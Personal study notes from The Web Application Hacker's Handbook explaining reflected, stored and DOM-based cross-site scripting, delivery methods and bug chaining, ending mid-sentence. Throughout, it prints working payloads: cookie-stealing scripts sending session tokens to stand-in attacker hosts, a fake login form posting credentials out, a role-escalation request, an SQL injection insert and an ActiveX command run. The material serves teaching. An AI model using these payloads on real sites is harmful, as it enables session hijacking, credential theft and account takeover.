**Note:** This is the seventh installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

# Attacking Users: Cross-Site Scripting (XSS)

Up to this point, most of the attacks we've discussed have involved targeting the *server-side* application. Techniques like SQL injection or file path traversal directly interact with the server in unexpected ways, allowing attackers to perform unauthorized actions or access sensitive data. While these attacks can certainly impact other users—such as by stealing their information—the primary focus has been manipulating the server itself.

The vulnerabilities we’re diving into now are different. In this chapter and the next, we explore attacks where the *attacker’s main target is other users* of the application—not the server. These attacks exploit weaknesses in how the application handles client-side behavior, enabling malicious activity against unsuspecting users. Despite this shift in focus, the flaws still exist within the application; it’s just that the *attacker leverages the application to deliver the attack to a user’s browser.*

The consequences of these attacks can be severe:

- Session hijacking

- Execution of unauthorized actions on behalf of the victim

- Theft of personal data

- Logging of keystrokes

- Execution of arbitrary JavaScript in the user's browser

And in some cases—if chained with browser vulnerabilities—even full control over the user's device.

In the early 2000s, most public discourse about security focused on *server-side vulnerabilities*—buffer overflows in server daemons, misconfigured services, and code injection bugs in back-end systems. Web application flaws like SQL injection and command execution were rampant and easy pickings for attackers.

Over time, as server-side security practices improved and frameworks evolved, *client-side attacks emerged* as the new frontier. Today, flaws like *Cross-Site Scripting (XSS)*, *Cross-Site Request Forgery (CSRF)*, and *session fixation* are widespread, even in high-security environments like online banking platforms.

Browser diversity has played a big role in this. A web application might behave in a predictable, controlled way on the server—but clients (users) can interact with it through countless combinations of browsers, extensions, outdated plugins, and varying JavaScript engines. This unpredictability massively expands the attack surface. For example, *Microsoft’s IIS web server* has seen far fewer critical security flaws in its modern versions, but its client counterpart, Internet Explorer, was once notorious for security holes. This trend is seen across the ecosystem—while back-end software is now more robust, *browsers and users remain highly exposed.*

The public spotlight has followed suit. Most users (and even many journalists) know terms like spyware, phishing, and browser Trojans—yet remain unaware of technical threats like SQL injection or file inclusion. Client-side attacks tend to be more visual, more personal, and unfortunately, more profitable. Why hack into a bank’s secure infrastructure when you can just trick 1% of its 10 million users into giving up their credentials via an XSS-driven phishing page? It’s easier, stealthier, and scales better.

Cross-Site Scripting (XSS) is the flagship vulnerability in the world of client-side attacks. It’s been around since the dawn of dynamic web pages—and it's still one of the most common bugs on the Internet today. From small blogs to major financial institutions, few are immune. In fact, XSS is often misunderstood even by seasoned testers. Different variants—*stored*, *reflected*, and *DOM-based*—each behave differently, require unique discovery techniques, and pose distinct risks.

This chapter is all about understanding and exploiting XSS in all its forms. The next chapter will dive into additional attacks against users—some of which share similarities with XSS, and others which reveal entirely new forms of mischief.

**Common Myths:**

*“Users get compromised because they aren't security-conscious.”*

While user negligence can play a role, this myth oversimplifies a complex reality. Many attacks against users succeed regardless of how cautious or well-informed the user is. For instance, *stored XSS* is a type of attack that requires no action at all from the victim—not even a click. If malicious JavaScript is embedded in a comment section or profile bio and then rendered whenever someone loads the page, boom—even the most paranoid, privacy-hardened user can be pwned by simply viewing the infected content.

This chapter and those that follow will show just how many techniques exist to compromise even savvy users—without needing them to download shady files or click suspicious links. Security isn’t just about user behavior—it’s also about app design.

*“XSS is a lame vulnerability.”*

Back when XSS was first gaining notoriety, even some seasoned penetration testers saw it as trivial. Why?

- It was everywhere—almost boringly common

- It didn’t offer instant root shell thrills like command injection

- It often required social engineering or context to be fully weaponized

But this view has aged like unrefrigerated milk. Over time, the community realized that XSS is not only extremely versatile and prevalent, but also dangerous in the right hands. It’s now considered a top-tier threat, capable of launching phishing attacks, hijacking sessions, bypassing CSRF protections, stealing tokens, logging keystrokes, and even infecting other users.

Worse yet, XSS can become self-replicating, like a web worm. Once triggered, it can propagate through the system—spreading itself by injecting malicious payloads into other users’ profiles, comments, or shared content. The infamous *Samy worm* on MySpace did exactly that, infecting over a million profiles in less than 24 hours.

*“You can’t fully compromise a web app using XSS.”*

False. And provably so. The authors—and many penetration testers since—have fully compromised live applications using only XSS. When conditions are right, a single XSS bug can snowball into:

- Session hijacking and account takeover

- Persistent backdoors in admin panels

- Stealing credentials or sensitive business data

- Turning browsers into zombie agents that perform actions on behalf of the attacker

All without touching the back-end server directly. So yes—you can own a web application via XSS. And in this cookbook, we’ll show you exactly how.

## Varieties of XSS:

Cross-Site Scripting (XSS) vulnerabilities appear in different forms, but all stem from the same basic flaw: *unsanitized user input being injected into a web page's output*. There are three major types of XSS, each with distinct mechanics and attack surfaces:

- Reflected XSS

- Stored XSS

- DOM-based XSS

Though they share the same core idea, they differ in how they are triggered, where the payload resides, and what kinds of detection and exploitation techniques are most effective. Let's start with the most common form:

### Reflected XSS:

Reflected XSS occurs when the application takes input from the user—usually via URL parameters—and reflects it immediately back in the HTTP response without proper sanitization. This type of XSS is called "reflected" because the malicious payload is delivered *in the request* and then *reflected back* in the server's response. A common example of this is when an application dynamically displays user-generated error messages.

Consider this URL:

```
http://example.com/error?message=Sorry%2C+an+error+occurred
```

This results in a page that displays:

```
<p>Sorry, an error occurred.</p>
```

The app simply reads the ```message``` parameter and injects its contents directly into the HTML. This behavior might seem harmless—but it's dangerously naive.

Now let’s modify the URL to inject a script:

```
http://example.com/error?message=<script>alert(1)</script>
```

If the application does not filter or escape this input, the output becomes:

```
<p><script>alert(1)</script></p>
```

And just like that, the browser executes the JavaScript, and you see a popup. This proves two key things:

- User input is being reflected directly into the page’s content.

- There’s no effective input sanitization or output encoding happening on the server.

A Note About Browser Behavior:

Modern browsers (especially older versions of Internet Explorer) sometimes include built-in XSS filters to block reflected XSS. If you're testing an example like this and nothing happens, it's not necessarily that the app is secure—your browser might just be intercepting the attack. To bypass this:

- Try using Firefox or Chrome, which tend to be more transparent during manual testing.

- Disable the XSS filter in Internet Explorer (not recommended unless you're in a lab environment): ```Tools → Internet Options → Security → Custom Level → Disable XSS Filter```

Later in this chapter, we’ll dig deeper into how these browser filters work—and how clever attackers still manage to bypass them.

**Characteristics of Reflected XSS:**

- Found in *URLs, query strings, and form submissions*

- Payload is *delivered in the request and executed in the response*

- Often used in phishing and social engineering campaigns (e.g., tricking a victim into clicking a malicious link)

- Sometimes referred to as *first-order XSS*, because the payload is triggered in a single request-response cycle

Reflected XSS accounts for roughly 75% of all XSS vulnerabilities observed in real-world applications. It’s fast to test, easy to exploit, and commonly overlooked. If you’ve ever clicked a sketchy link and a popup greeted you unexpectedly—that might’ve been reflected XSS saying hello.

## Exploiting Reflected XSS Vulnerabilities:

XSS vulnerabilities can be leveraged in many different ways, often depending on the attacker’s goals. One of the most common—and dangerous—scenarios involves capturing the *session token* of a logged-in user. Once an attacker has access to this token, they can impersonate the user and interact with the application on their behalf, bypassing the need for credentials entirely. Let’s break down how a basic reflected XSS session hijack works.

1. The user logs in and receives a session cookie:

After a successful login, the server sets a session identifier via an HTTP response header like so:

```
Set-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3
```

This session token is now stored in the browser’s cookie jar and sent with every request to the application.

2. The attacker lures the user into clicking a malicious URL:

Here’s a booby-trapped link crafted by the attacker:

```
http://mdsec.net/error/5/Error.ashx?message=<script>var i = new Image(); i.src='http://mdattacker.net/?c=' + document.cookie;</script>
```

This payload does *not* show a popup. Instead, it silently sends the user’s cookies to the attacker's server using a sneaky little image request.

3. The user clicks the link:

Maybe the attacker sent the link via email, instant message, or embedded it in a forum post. The user, unsuspecting, clicks it.

4. The vulnerable application reflects the malicious script:

Because of the reflected XSS bug, the server echoes back the ```message``` parameter straight into the response page, like this:

```
<p><script>var i = new Image(); i.src='http://mdattacker.net/?c=' + document.cookie;</script></p>
```

5. The browser executes the attacker's script:

The user's browser loads the response from ```mdsec.net```, sees the ```<script>``` tag, and *runs it within the security context of mdsec.net.* That means any JavaScript has full access to cookies, sessionStorage, localStorage, and any other client-side goodies set by mdsec.net.

6. The attacker's script steals the session token:

Let’s break down the code:

```
var i = new Image();
i.src = "http://mdattacker.net/?c=" + document.cookie;
```

The script creates a new invisible image and sets its ```src``` attribute to the attacker's server, appending the current session cookie. The browser makes a **GET request** like this:

```
GET /?c=sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
Host: mdattacker.net
```

Boom—the session is exfiltrated.

7. The attacker uses the stolen session token:

Now the attacker simply copies the token into their browser:

```
Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3
```

They’re now logged in *as the user*, with full access to everything that user can see and do—account settings, personal info, banking transactions, whatever the app exposes.

*But Wait—Why Not Just Load the Malicious Script From the Attacker's Site?*

Why go through all the trouble of injecting the script into a legitimate domain instead of just sending the user to:

```
http://mdattacker.net/evil.js
```

Here’s the catch: *same-origin policy (SOP).*

Browsers enforce SOP to prevent scripts from one domain from accessing content (like cookies or DOM elements) from another. So if you open a malicious script hosted on ```mdattacker.net```, that script *cannot* access cookies set by ```mdsec.net```. The browser sees them as separate, isolated contexts.

Cookies are:

- Automatically sent only to the domain that issued them

- Accessible via JavaScript *only* on pages from that same domain

So if the attacker’s script runs from ```mdattacker.net```, it’s trapped in its own sandbox. But if the attacker can inject their script into *a page returned by mdsec.net*, then the browser sees it as trusted code from ```mdsec.net```—and hands over the cookies. That’s why it’s called cross-site scripting: the attacker *crosses domains* by smuggling their code into a trusted site, tricking the browser into violating trust boundaries.

*Extra Gotcha: Persistent Cookies and "Remember Me"*

Some applications issue *long-lived cookies* to implement "remember me" features. These cookies are valid even when the user isn’t actively logged in. In such cases, *step 1 (logging in)* isn’t even necessary. If a vulnerable user visits the malicious link while not logged in, the stolen persistent cookie can still be used by the attacker to impersonate them—sometimes weeks after the initial click.

## Stored XSS Vulnerabilities:

*Stored Cross-Site Scripting (XSS)*—sometimes called *persistent XSS*—is a particularly dangerous variant where malicious input from an attacker is permanently stored on the server (often in a database), and later served to other users without proper sanitization or output encoding.

Unlike reflected XSS, which relies on a single crafted request and immediate reflection, *stored XSS lives inside the application* like a parasite, waiting to execute whenever someone stumbles upon the infected content.

Stored XSS commonly appears in applications that allow:

- *User-to-user interaction* (e.g., forums, auctions, messaging systems)

- *User-generated content* (e.g., blog comments, product reviews, support tickets)

- *Admin dashboards* that display user-submitted data

Here’s a classic example:

Imagine an online auction platform where buyers can submit questions about a listed item, and sellers (and other buyers) can view and respond. If the app fails to sanitize the question content, an attacker could post the following:

```
<script>
  fetch('http://evil.net/steal?c=' + document.cookie)
</script>
```

Now, every time a seller—or even another buyer—views that question, the payload executes. The attacker could:

- Steal session tokens

- Auto-place bids on items

- Manipulate pricing data

- Trick users into accepting fake offers

If an admin views that poisoned content? Game over. You now control the control panel.

Stored XSS usually involves *two steps:*

1. Injection phase:

The attacker submits malicious input via a form, API, or comment field:

```
POST /submit-question HTTP/1.1
Content-Type: application/x-www-form-urlencoded

question=<script>new Image().src='http://evil.net/x?c='+document.cookie</script>
```

The server stores it in a database—e.g., ```questions``` table.

2. Trigger phase:

Later, another user (victim) visits a page like:

```
http://auction.site/item?id=123
```

This page fetches the attacker’s stored question from the database and renders it *without sanitization.* When the victim’s browser loads the page, the JavaScript executes automatically. Because of this two-step nature, stored XSS is also called *second-order XSS*—even though it technically doesn’t involve any “cross-site” behavior. The name sticks for tradition’s sake.

Compared to reflected XSS, stored XSS carries several serious advantages for the attacker:

- *No need for social engineering.* The attacker doesn’t need to trick victims into clicking a link. The payload is already embedded in the app.

- *Guaranteed victim presence.* If the injected script appears in a part of the application that users regularly visit, execution is inevitable.

- *Automatic context.* If the target page is within the authenticated area, the victim will be logged in by default, making it easier to:

*Hijack sessions*

*Perform actions on behalf of the victim*

*Access sensitive data*

- *Admin impact = total compromise.* If the stored payload is viewed by an admin, the attacker might:

*Add themselves as an admin user*

*Modify application settings*

*Delete logs or user accounts*

*Drop backdoors*

**Example:**

A social media platform allows users to update their profile bio. The attacker sets their bio to:

```
<script src="http://evil.site/x.js"></script>
```

Every time an admin views user profiles (for moderation or review), the script runs. ```x.js``` could silently send session tokens or even use ```fetch()``` to issue admin API requests.

Stored XSS often slips through because:

- Developers trust stored data (“it’s already in our system”)

- Input validation is missing or inconsistent

- Output encoding (like ```htmlspecialchars()``` or context-aware escaping) isn’t used during rendering

If reflected XSS is a trapdoor, stored XSS is a landmine. You plant it once and wait for someone to step on it.

## DOM-Based XSS Vulnerabilities:

We’ve seen how both *reflected* and *stored XSS* revolve around a shared idea: the server receives user-supplied input and carelessly embeds it into a response, which the browser then renders and executes. But there’s a third kind of XSS—one that doesn’t require the server to reflect anything at all.

In *DOM-Based XSS*, the attacker’s script never touches the server’s response. Instead, the vulnerability lies *entirely in the client-side JavaScript* that runs in the browser. Here’s the general flow:

1. The attacker crafts a URL with malicious input—often in the query string or hash fragment.

2. The server responds *with the same static content*, unaware of any malicious intent.

3. The browser runs client-side JavaScript from that page.

4. That JavaScript reads the URL and *uses its contents to dynamically modify the page.*

5. Boom. Malicious code is injected into the DOM and executed, all thanks to insecure DOM manipulation.

The key thing: the server is completely innocent. The JavaScript in the browser is doing all the dirty work.

Let’s say the server responds with the following static HTML for an error page:

```
<html>
<body>
  <script>
    var url = document.location.toString();           // Step 1: Get full URL
    url = unescape(url);                              // Step 2: Decode any encoded characters
    var message = url.substring(url.indexOf('message=') + 8);
    document.write(message);                          // Step 3: Inject message into page
  </script>
</body>
</html>
```

Let’s walk through this:

- ```document.location``` gets the full URL (e.g., ```http://mdsec.net/error?message=Hello```).

- ```unescape()``` decodes any ```%xx``` URL-encoded characters (e.g., ```%3Cscript%3E``` → ```<script>```).

- It extracts the text after ```message=``` using ```substring()```.

- Then it calls ```document.write()``` to inject that content directly into the page’s HTML.

Seems harmless, right? Well...

Now suppose an attacker sends this URL to a victim:

```
http://mdsec.net/error?message=<script>alert('XSS!')</script>
```

The JavaScript pulls out ```<script>alert('XSS!')</script>``` from the URL and *injects it into the DOM* using ```document.write()```. The browser happily runs it. The script never came from the server. It was built in the browser using data extracted from the URL.

*But where this JavaScript even comes from in the first place?*

In real-world apps, client-side JavaScript often:

- Enhances UX (think: dynamically rendered error messages, alerts, previews)

- Parses query strings or fragments for page logic

- Reflects URL data into the DOM (e.g., ```Hello, {name}``` in dashboards)

Developers often write helper functions or use front-end frameworks like React, Angular, or Vue—sometimes insecurely. That’s where DOM-based XSS sneaks in: when the *client-side logic* blindly trusts and renders URL-based input.

**Bad DOM Practices That Lead to XSS:**

Some red flags in JavaScript that scream “I’m vulnerable!”:

```
document.write(input);
element.innerHTML = input;
location.href = "..." + input;
eval(input);
setTimeout(input, 1000);
```

Even more dangerous when ```input``` is built from:

- ```document.location```

- ```document.URL```

- ```document.referrer```

- ```window.name```

- ```location.hash```

These are all *attacker-controlled* in the browser.

DOM XSS vs Reflected XSS:

```
| Feature                             | Reflected XSS | DOM-Based XSS |
| ----------------------------------- | ------------- | ------------- |
| Payload appears in server response? | ✅ Yes         | ❌ No          |
| Code injection done by server?      | ✅ Yes         | ❌ No          |
| Code injection done by client?      | ❌ No          | ✅ Yes         |
| Exploitable via crafted URL?        | ✅ Yes         | ✅ Yes         |
| Detected by proxy tools?            | ✅ Usually     | ❌ Not always! |
```

This is what makes DOM-based XSS trickier to detect. Tools like Burp or ZAP might not see the script in the response body, because it isn’t there—it gets born inside the browser after the response is rendered.

**Real-World DOM XSS Payloads:**

Attackers love abusing ```location.hash``` and ```innerHTML```, like so:

```
<!-- vulnerable.html -->
<div id="output"></div>
<script>
  var hash = location.hash.substr(1); // Skip the #
  document.getElementById("output").innerHTML = hash;
</script>
```

Now go to:

```
vulnerable.html#<img src=x onerror=alert(1)>
```

XSS is executed when the browser renders the injected ```img``` tag.

More detailed breakdown:

1. ```location.hash```

This gives you the part of the URL after the ```#```. For example:

```
vulnerable.html#HelloWorld
```

```location.hash``` → ```"#HelloWorld"```

2. ```.substr(1)```

Strips off the ```#```, so:

```
hash = "HelloWorld"
```

3. ```.innerHTML = hash```

This takes the string and *injects it directly into the page, as raw HTML.* This is the dangerous part!

Now the XSS Payload:

Say an attacker sends this URL:

```
vulnerable.html#<img src=x onerror=alert(1)>
```

The script does this:

```
hash = "<img src=x onerror=alert(1)>"
document.getElementById("output").innerHTML = "<img src=x onerror=alert(1)>"
```

Result: The image tag is added to the DOM, ```onerror``` triggers (because ```x``` isn’t a valid image), and ```alert(1)``` pops. No server involved. No response reflection. Just JavaScript trusting the URL blindly.

Why This Matters:

- ```innerHTML``` renders *whatever it’s given*, including ```<script>```, ```<img>```, ```<iframe>```, etc.

- ```location.hash``` is *fully controlled by the user*, but many devs think it’s “safe” because it’s never sent to the server. (Wrong.)

- This is DOM-Based XSS through and through—client-side only, stealthy, and hard to detect.

*Key Takeaway:* DOM-based XSS is a client-side vulnerability where *the browser becomes the attack surface*, and malicious input is executed thanks to unsafe JavaScript logic. The server never directly outputs the payload, making it harder to detect but no less dangerous.

*Rule:* If your JavaScript is inserting anything into the page, make damn sure it’s escaped properly and never trusts ```location```, ```hash```, or ```referrer```.

**Real-World XSS Attacks:**

XSS isn’t just a theoretical risk—it’s been used in the wild to devastating effect. Here's a taste of what it can unleash:

- Apache Foundation (2010):

A reflected XSS in their bug tracker let an attacker hijack an admin session via a disguised link. This led to full admin access, malware uploads, credential theft, and lateral movement across systems—a full-blown compromise from a single click.

- MySpace Worm (2005):

User "Samy" bypassed MySpace’s filters and injected a self-replicating script into his profile. Victims automatically friended him and copied the worm to their own profiles. It spread like wildfire, infecting over a million users in hours. This was a stored XSS turned viral worm—pure JavaScript contagion.

- StrongWebmail Challenge (2009):

A $10,000 bounty to hack the CEO’s inbox backfired. Hackers exploited a stored XSS in email rendering to hijack the CEO’s session just by him opening a malicious email. If your webmail displays HTML, it’s a ticking XSS time bomb.

- Twitter Worms (2009):

Stored XSS and DOM-based flaws allowed attackers to spread worms that auto-posted messages promoting their sites. Twitter had to scramble to patch multiple bugs. DOM XSS in modern SPAs (like Twitter) is stealthy and persistent.

*The Moral of the Story:*

XSS is not just pop-ups. It can:

- Steal sessions

- Self-replicate like worms

- Hijack admin accounts

- Steal credentials silently

- Escalate to full infrastructure compromise

And worst of all: it only takes one user to click.

**Payloads for XSS Attacks:**

While session hijacking is the poster child of XSS attacks, it's far from the only trick in the book. In reality, *any XSS vulnerability is a gateway* for delivering malicious payloads that manipulate, deceive, or exfiltrate user data—right in their own browser, all under the illusion of legitimacy.

*Virtual Defacement:*

This involves injecting rogue HTML or JavaScript into a web page to change what users see, without modifying the actual files on the server. Example:

```
<script>
  document.body.innerHTML = "<h1>This site has been hacked by Umbra Vigilis!</h1>";
</script>
```

Why it matters:

- The website itself remains untouched.

- From the user’s point of view, it looks like the site has been defaced.

- It can be used for trolling... or for serious disinformation campaigns. A convincing defacement on a financial institution’s page could affect stock prices, public trust, or trigger mass panic. All from one script.

*Injecting Trojan Functionality:*

This goes a step beyond just visual changes—*it introduces fake functionality* to trick users into performing unsafe actions. A classic move: injecting a fake login form that sends credentials to the attacker’s server. Example:

```
<form action="https://evil.attacker.com/steal" method="POST">
  <input name="username" placeholder="Username">
  <input name="password" placeholder="Password" type="password">
  <button type="submit">Login</button>
</form>
```

Bonus move: After stealing creds, auto-login the user into the real app so they don’t even notice. Another trick is to display a fake "upgrade" or "promo" offer, asking for credit card details. Example prompt: “Get 6 months free premium! Just confirm your card below.”

What makes this dangerous:

- The URL is genuine (e.g. ```https://trustedsite.com/page?ref=free-upgrade```)

- The SSL cert is valid

- Users are already logged in, making it feel authentic

Unlike traditional phishing, this doesn’t need a fake website. It weaponizes the real one against its own users.

**TL;DR:** XSS isn’t just about alerts and token theft. It’s a full-blown delivery mechanism for Trojan UX, fake forms, malicious redirects, and reality distortion. And because it comes from a legit domain, users often won’t even question it.

### Inducing User Actions via XSS:

When an attacker hijacks a user's session, they essentially become that user—able to access everything the user can. But session hijacking has drawbacks:

- The attacker needs to *catch and monitor* session tokens in real-time.

- Actions must be *manually performed* for each compromised user.

- Application logs may clearly point to *a single attacker IP*, blowing the op.

Instead of hijacking sessions and interacting directly, an attacker can inject JavaScript that *forces the user’s own browser* to perform actions on their behalf—quietly, invisibly, and instantly. Key Advantages:

- No session monitoring needed.

- Each browser executes the payload locally as the victim.

- Log trail points to the victim's IP, not the attacker.

- Works brilliantly at scale—even if only one user out of thousands has admin access, that’s enough.

Let’s say the attacker wants to upgrade their own account to admin. Doing that manually via session hijack would be a pain—especially if they need to find out who the admins are first. Instead, the injected script can do something like:

```
fetch("/admin/role-edit", {
  method: "POST",
  credentials: "include",
  body: "user=evilguy&role=admin",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
});
```

Now every compromised user attempts to promote the attacker’s account. Most will fail, but as soon as an admin views the infected page… bingo. Admin rights achieved.

Breakdown:

- ```"/admin/role-edit"```: This is the target endpoint. In a real app, it might be something like ```/admin/users/update```, ```/users/permissions```, or even ```/api/v1/users/42/role```. It represents a privileged operation that modifies a user's role—accessible only by admins (ideally).

- ```method: "POST"```: A state-changing HTTP method. Often used for updates or form submissions. Important: GET would usually be read-only, so POST implies something's changing under the hood.

- ```credentials: "include"```: This tells the browser to include cookies and session tokens with the request. So the server sees it as a legit request from the victim, not the attacker.

- ```body: "user=evilguy&role=admin"```: This is the payload data, pretending to edit a user's role. It’s form-encoded, like a normal HTML form submission.

- ```Content-Type: "application/x-www-form-urlencoded"```: Matches what most web apps expect from regular form submissions.

*Ajax and XSS: A Perfect Match*

The infamous MySpace worm is a textbook example. The worm:

- Used JavaScript to send AJAX requests behind the scenes.

- Automatically friended the attacker.

- Injected itself into the victim’s profile.

- Spread like wildfire to every new profile viewer.

The attack exploited *native Ajax functions already present on the site*—the attacker’s script just piggybacked on them to perform the same actions a user would.

*Framing Victims for SQL Injection*

Want to stay stealthy while escalating your control? Use a compromised user’s browser to *trigger other vulnerabilities*, like SQL injection. Example idea:

```
var img = new Image();
img.src = "/search?query=';INSERT INTO users VALUES ('evil', 'pass123', 'admin');--";
```

This request:

- Gets executed by the victim’s browser.

- Appears in logs as their activity.

- Leaves no clear trace of the attacker.

**TL;DR:** You don’t need to hijack sessions or go full “live control.” Let the victims do the work. With the right payload, they’ll attack the app for you, promote your account, or inject code—all while you're chilling with coffee.

## Exploiting Trust Relationships via XSS:

Cross-Site Scripting doesn’t just hijack sessions—*it undermines trust itself.* Browsers implicitly trust the code they receive from a domain, and XSS takes advantage of this assumption in devastating ways. Let’s look at some lesser-known trust vectors that an attacker can abuse using XSS payloads.

1. Stealing Autocomplete Data:

Modern browsers often auto-fill forms with saved information—email addresses, phone numbers, even passwords (if allowed). If the application uses forms with ```autocomplete``` enabled, an injected JavaScript payload can:

- Dynamically *create a fake form* with common field names like email, username, or address.

- Wait for the browser to auto-populate the fields.

- Use JavaScript (e.g., ```document.forms[0].email.value```) to read the data.

- Silently exfiltrate that info to the attacker’s server.

**Tool highlight:** Yes, tools like *BeEF* (Browser Exploitation Framework) are very good at this. They provide pre-built payloads for harvesting autofill data, making this kind of attack easy to stage with minimal scripting knowledge.

2. Exploiting the "Trusted Sites" Zone:

Some enterprise applications (especially older ones) instruct users to add them to the *“Trusted Sites” zone* in browsers like Internet Explorer. Bad idea. Really bad. Here’s why:

- When a domain is in the Trusted Sites zone, *browser security settings are relaxed*—ActiveX is enabled, restrictions on JavaScript are loosened, etc.

- If an attacker finds an XSS flaw on such a domain, they can execute *arbitrary code on the local machine.*

For example, in older IE versions:

```
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
</script>
```

This would actually launch Calculator. In the hands of a real attacker, it could just as easily launch malware.

**Note:** This attack doesn’t work in modern browsers or Windows setups, because ActiveX has been deprecated and Trusted Sites are much less powerful. But some *legacy systems* still survive in corporate graveyards.

3. Bypassing Origin Checks Inside ActiveX Controls:

Some applications used custom ActiveX controls or browser plugins that checked only whether they were being loaded from the "right" website. But here’s the kicker:

- If your attack comes via an XSS flaw, then the script is running from the *real* website.

- The control happily executes whatever command it’s handed.

This was particularly dangerous with financial or healthcare applications that used specialized controls to perform sensitive tasks, assuming origin was a sufficient protection.

**Modern equivalent:** Today, this logic still applies to *JavaScript-based widgets, embedded iframes*, and some poorly secured browser extensions that check ```document.origin``` or ```referrer``` in weak ways.

*MYTH: “XSS and Phishing Only Matter on Public Websites”*

Total nonsense. Internal apps—admin dashboards, HR portals, ticketing systems—are prime targets. Here’s how attackers exploit them:

- They craft a malicious email sent to internal staff.

- The message contains a link that exploits XSS in an *intranet-based* app.

- Once clicked, the victim’s browser loads the attack payload *from within the trusted network.*

Why it works:

- Social trust: It’s coming from a coworker or "IT support."

- Browser trust: In some environments (especially with legacy IE and Windows domains), browsers automatically trust intranet zones, lowering security protections. Result? You’re hacked from the inside, while security teams are still looking at firewalls and VPN logs.

**TL;DR:** XSS is more than just script injection. It’s a scalpel that slices through browser trust models—*autocomplete, intranet permissions, ActiveX relics*, and *social engineering* all collapse under its weight. Think beyond the browser window—*XSS is where the front-end meets the dark arts.*

## Escalating the Client-Side Attack:

Once an attacker finds an XSS vulnerability, the browser becomes their playground. But things don’t stop at session hijacking—*JavaScript can be used to perform a wide range of offensive actions* directly against the user:

- Log keystrokes using event listeners (keydown, keypress).

- Read browser history (via timing attacks or CSS trickery).

- Scan internal IPs and ports to map the victim’s local network.

- Fingerprint installed plugins, fonts, or devices for targeting.

- Manipulate the DOM or abuse APIs like WebRTC to extract more info.

And if the vulnerability is persistent (stored XSS), the attacker doesn’t even need to lure users to a special page—*the payload is waiting passively* inside the application.

### Delivery Mechanisms for XSS Payloads:

Crafting a malicious script is only half the game. Now comes delivery—how do we get the victim to execute it? The answer depends on the type of XSS (reflected, stored, DOM-based), but there’s an entire arsenal of methods. Let’s break them down.

1. Targeted Email Attacks (Spear Phishing):

Reflected and DOM-based XSS often rely on a *crafted URL* with a malicious payload. One simple delivery method? Send it in an email.

- Generic phishing: Spam it to as many users as possible.

- Spear phishing: Send a highly personalized message to a specific target, like an admin. Example: "Hey, I think there's a bug on this link—it crashes the site for me."
```http://example.com/app/page?query=<script>attack()</script>```

2. Instant Messaging and Chat:

A link dropped into a corporate Slack, Discord, or MS Teams? That’s social engineering gold—high trust, high impact. Same with public comment threads on forums, issue trackers, or collaborative tools.

3. Third-Party Websites and External Content Embeds:

Some platforms allow limited HTML posts (e.g., ```<img>``` tags or links). Even without full script access, an attacker can:

- Embed a crafted ```<img>``` tag targeting the vulnerable site:

```
<img src="http://vulnsite.com/page?param=<script>attack()</script>" />
```

- Lure logged-in users to their blog, news post, or meme page that silently executes the payload in the background.

- Use ```iframe```, ```form```, or ```fetch()``` tricks to deliver *POST-based payloads*, not just GET ones.

Moral: Even if the XSS vuln requires POST, an attacker can simulate form submission from another site.

4. Attacker-Controlled Websites with SEO Traps:

Sometimes the payload isn’t linked directly to the victim—it’s *disguised as clickbait or helpful content:*

- A malicious website with a cool tool, guide, or video.

- Embedded scripts make background requests to the vulnerable site *while the user is still logged in.*

- A cleverly placed ```<form method="post">``` targets a POST-only XSS vuln, submitted via JS.

Even more sinister—if the attacker uses SEO manipulation (keywords, links), they can get organic traffic and let the attack run on autopilot.

5. Banner Ads as Weaponized Payloads:

Yes, seriously. Some attackers:

- Buy ad space on networks that serve banners.

- Insert malicious URLs pointing to the vulnerable app, possibly using obfuscated JS.

- If the ad gets served on the *same site* as the vuln, browser security checks like ```Referrer Policy``` or CSP may be sidestepped.

There have been cases where an ad delivering an XSS payload was shown on the very website it targeted. That’s like breaking into the vault by mailing yourself a key via their own postal system.

6. “Tell a Friend” / Feedback Features:

Websites that let users email content to others (contact forms, referral systems) are an underrated attack vector:

- If the app sends the message using *its own mail server*, the XSS payload gains credibility.

- It appears to come from a legitimate sender, increasing chances the target will trust it.

Even security-savvy users might fall for this if the email appears internal and doesn't trigger spam/phishing filters.

**TL;DR:** XSS Delivery is a Game of Strategy

Finding a vulnerable parameter is just the start. The real power of XSS comes from how, when, and where you inject the payload. Whether it’s email, ads, forms, or fake blogs—the delivery method shapes the scale and stealth of the attack.

### Delivering Stored XSS Attacks:

Stored XSS (also called persistent XSS) is often the most dangerous variety because *the payload lives inside the application.* No phishing tricks required—the victims come straight to the poisoned page on their own. But how does the attacker get the payload there in the first place?

**In-Band Delivery (Direct Injection):**

This is the most common method: the attacker submits the malicious payload directly through the application's main web interface, targeting any field or feature that stores user input and later renders it in HTML. Common targets include:

- Profile fields like name, email, or address

- Names of uploaded files, images, or documents

- Public messages, comments, or feedback forms

- Data shown in application logs (User-Agent, Referer, URL params)

- Shared content from uploaded documents or spreadsheets

**Example:** A user sets their display name to:

```
<script>fetch('https://evil.com/cookie?c='+document.cookie)</script>  
```

If this name is later shown in the dashboard or welcome message without sanitization—boom—every viewer gets scripted.

**Out-of-Band Delivery (Indirect Injection):**

In some cases, the attacker doesn’t interact with the web app directly. Instead, they inject malicious data via external systems (SMTP, APIs, or integrations) that eventually get displayed by the app. Classic example:

- Send an HTML email with a ```<script>``` payload to a webmail service.

- When the recipient opens the email in their browser, stored XSS triggers—without the attacker needing to touch the app itself.

This kind of attack is sneaky and especially useful when apps pull in *external data sources*, such as logs, error messages, third-party APIs, or feedback channels.

**Chaining XSS With Other Bugs:**

Now here’s where things get spicy. Two low-risk bugs can combine into a critical breach.

*Example 1: Stored XSS + Broken Access Control*

Let’s say the app:

- Allows users to set a display name (with stored XSS vuln)

- Also lets any user edit anyone else's display name

Individually, neither bug seems catastrophic. But together? The attacker automates editing every user’s name to inject:

```
 <script src="https://evil.com/x.js"></script>
```
 
Now, every login triggers script execution. If an admin logs in, the attacker hijacks the session and escalates privileges.

*Example 2: Stored XSS + CSRF*

Another subtle but deadly combo:

- An app lets users submit some input—say a personal note—via a POST form.

- The form isn’t protected by CSRF tokens.

- The submitted note is later shown only to the user, but is vulnerable to stored XSS.

Attack flow:

1. The attacker sends a phishing link to the victim:

```
https://evil.com/payload.html
```

2. The page contains this auto-submitting CSRF form:

```
